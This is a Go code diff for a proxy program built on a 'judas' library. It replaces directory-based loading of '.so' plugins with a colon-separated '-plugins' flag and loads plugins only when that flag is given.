@@ -12,6 +12,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/joncooperworks/judas"
@@ -28,7 +29,7 @@ var (
 	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
 	proxyCACertFilename = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
 	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
-	pluginsDir          = flag.String("plugins-dir", "./plugins", "Directory for plugins")
+	pluginPaths         = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
 )
 
 func exitWithError(message string) {
@@ -107,20 +108,20 @@ func main() {
 		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
 	}
 
-	pluginFilePaths, err := filepath.Glob(filepath.Join(*pluginsDir, "*.so"))
-	if err != nil {
-		exitWithError(err.Error())
-	}
-
-	plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
-	if err != nil {
-		exitWithError(err.Error())
-	}
-
 	transport := &judas.InterceptingTransport{
 		RoundTripper: httpTransport,
-		Plugins:      plugins,
 	}
+
+	if *pluginPaths != "" {
+		pluginFilePaths := strings.Split(*pluginPaths, ":")
+		plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
+		if err != nil {
+			exitWithError(err.Error())
+		}
+
+		transport.Plugins = plugins
+	}
+
 	config := &judas.Config{
 		TargetURL:            u,
 		ResponseTransformers: responseTransformers,
